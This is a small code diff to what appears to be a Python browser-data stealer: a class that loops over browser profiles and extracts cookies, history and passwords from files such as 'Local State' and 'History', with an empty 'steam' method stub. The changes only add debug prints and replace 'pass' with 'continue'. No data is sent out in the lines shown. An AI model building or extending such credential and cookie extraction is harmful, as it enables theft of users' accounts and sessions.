@@ -22,6 +22,7 @@ class Main:
             profiles = ["Default"]
 
             try:
+                print("a")
             
                 for folder in os.listdir(browser):
                     if folder.startswith("profile".lower):
@@ -34,10 +35,11 @@ class Main:
                     cookies = browserExtractor.extractCookies(browser+f"\\{profile}")
             
             except FileNotFoundError:
-                pass
+                continue
 
         for browser in extractor.browsers:
             try:
+                print("a")
 
                 browserExtractor = extractor.Extract(browser+"\\Local State")
                 history = browserExtractor.extractHistory(browser+"\\History")
@@ -48,7 +50,7 @@ class Main:
                 print(passwd)
                 print(cookies)
             except FileNotFoundError:
-                pass
+                continue
 
     def steam(self):
         pass
